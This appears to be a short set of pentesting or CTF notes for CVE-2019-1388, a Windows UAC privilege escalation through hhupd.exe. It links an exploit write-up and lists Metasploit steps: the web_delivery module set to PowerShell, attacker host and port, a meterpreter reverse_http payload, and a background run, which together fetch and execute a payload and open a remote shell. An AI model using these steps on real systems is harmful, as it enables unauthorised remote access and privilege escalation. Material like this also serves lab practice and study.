
CVE: CVE-2019-1388
File: hhupd.exe
Exploit: https://sotharo-meas.medium.com/cve-2019-1388-windows-privilege-escalation-through-uac-22693fa23f5f

Tools:

=== Shell ===

Metasploit: 
exploit/multi/script/web_delivery
1. set the target to PSH (PowerShell)
2. set your lhost and lport
3. set payload windows/meterpreter/reverse_http
4. run -j